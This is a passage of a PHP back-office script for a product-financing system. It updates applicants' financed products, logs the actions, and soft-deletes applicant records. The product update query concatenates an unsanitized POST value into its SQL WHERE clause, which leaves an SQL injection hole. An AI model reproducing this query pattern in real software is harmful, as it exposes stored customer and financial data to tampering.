        alert_msg('error', 'Error', 'Product Already Assigned');
        header("Location: applicants.php?view=edit&ap_id=".$applicantID."&step=4", true, 301);
        exit();
    }else{
    
        $values = array(
                            'id_applicant'	        =>  cleanvars($applicantID) 
                            ,'id_product'	        =>  cleanvars($_POST['id_product'])
                            ,'product_nature'	    =>  cleanvars($_POST['product_nature']) 
                            ,'product_model'		=>  cleanvars($_POST['product_model'])
                            ,'product_other_details'=>  cleanvars($_POST['product_other_details']) 
                            ,'actual_price'         =>  cleanvars($_POST['actual_price']) 
                            ,'advance_amount'       =>  cleanvars($_POST['advance_amount'])
                            ,'financing_amount'     =>  cleanvars($_POST['financing_amount'])
                            ,'security_amount'      =>  cleanvars($_POST['security_amount'])
                            ,'number_of_months'     =>  cleanvars($_POST['number_of_months'])
                            ,'interest_rate'        =>  cleanvars($_POST['interest_rate'])
                            ,'monthly_installment'  =>  cleanvars($_POST['monthly_installment']) 
                            ,'total_receivable'     =>  cleanvars($_POST['total_receivable']) 
                            ,'installment_due_date' =>  cleanvars($_POST['installment_due_date']) 
                            ,'financing_mode'       =>  cleanvars($_POST['financing_mode']) 
                            ,'remarks'              =>  cleanvars($_POST['remarks']) 
                    );

        $sqllmsApplicant = $dblms->Update(APPLICANT_PRODUCTS, $values, "WHERE ap_products_id = '".$_POST['ap_products_id']."'");

        if($sqllmsApplicant) { 

            // $valueStatus = array(
            //                         'ap_status'     =>  cleanvars($_POST['ap_status']) 
            //                     );
            // $sqllmsApplicantStatus = $dblms->Update(APPLICANTS, $valueStatus, "WHERE ap_id  = '".$applicantID."'");

            // if(cleanvars($_POST['ap_status']) == 1 && cleanvars($_POST['create_challan']) == 1 && cleanvars($_POST['ap_advance']) > 0){

            //     $challanDate 	= substr(date('Y'),2,4);
            //     $issueDate 	= date('Y-m-d');
            //     $dueDate 	= date('Y-m-d' , strtotime($issueDate. ' + 10 day'));

            //     //Generate Challan Number
            // 	$sqllmsChallan 	= $dblms->querylms("SELECT challan_no 
            // 											FROM ".CHALLANS." 
            // 											WHERE challan_no LIKE '9931".$challanDate."%'  
            // 											ORDER by challan_no DESC LIMIT 1 ");
            // 	if(mysqli_num_rows($sqllmsChallan) < 1) {
            // 		$challanNo	= '9931'.$challanDate.'00001';
            // 	} else  {
            //         $valueChallan = mysqli_fetch_array($sqllmsChallan);
            // 		$challanNo = ($valueChallan['challan_no'] +1);
            // 	}

            //     $dataChallan = array(
            //         'status'		        =>  '2', 
            //         'challan_no'	        =>  $challanNo, 
            //         'challan_type'	        =>  '1', 
            //         'id_applicant'	        =>  cleanvars($applicantID), 
            //         'total_amount'		    =>  cleanvars($_POST['ap_advance']), 
            //         'issue_date'            =>  $issueDate,
            //         'due_date'              =>  $dueDate,
            //         'id_added'              =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA']),
            //         'date_added'            =>  date('Y-m-d H:i:s')
            //     );

            //     $sqllmsInsert  = $dblms->Insert(CHALLANS , $dataChallan);
            // }

            //Set Success MSG in Session & Exit
            $remarks = 'Update Applicant Product#:'.$applicantID;
            $values = array (
                "id_user"       =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA']),
                "filename"      =>  strstr(basename($_SERVER['REQUEST_URI']), '.php', true),
                "action"        =>  '1',
                "dated"         =>  date('Y-m-d h:i:s'),
                "ip"            =>  cleanvars($ip),
                "remarks"       =>  cleanvars($remarks)
            );
            $sqllms  = $dblms->insert(LOGS, $values);
            alert_msg('info', 'Success', 'Applicant Product Updated Successfully.');
            header("Location: applicants.php?view=edit&ap_id=".$applicantID."&step=4", true, 301);
            exit();
        }
    }
}

// DELETE Applicant
if(isset($_POST['submit_delete'])) {
		
    $values = array(
                    'id_deleted'	=>	cleanvars($_SESSION['userlogininfo']['LOGINIDA'])
                    ,'is_deleted'	=>	'1'
                    ,'ip_deleted'	=>	cleanvars($ip)
                    ,'date_deleted'	=>	date('Y-m-d H:i:s')
                   );   

    $sqlDel = $dblms->Update(APPLICANTS , $values , "WHERE ap_id  = '".cleanvars($_POST['ap_id'])."'");

    if($sqlDel) { 
        $remarks = 'Delete Applicant#:'.cleanvars($_POST['ap_id']);
        $values = array (
                            "id_user"			=>	cleanvars($_SESSION['userlogininfo']['LOGINIDA'])
                            ,"filename"		=>	strstr(basename($_SERVER['REQUEST_URI']), '.php', true)
                            ,"action"			=>	'3'
                            ,"dated"			=>	date('Y-m-d h:i:s')
                            ,"ip"				=>	cleanvars($ip)
                            ,"remarks"		=>	cleanvars($remarks)
                            ,"id_deleted"		=>	cleanvars($_SESSION['userlogininfo']['LOGINIDA'])
                            ,"ip_deleted"		=>	cleanvars($ip)
                            ,'date_deleted'	=>	date('Y-m-d H:i:s')
                        );
        $sqllms  = $dblms->insert(LOGS, $values);
        alert_msg('success', 'Success', 'Applicant deleted Successfully.');
        header("Location: applicants.php", true, 301);
        exit();
    }
}
?>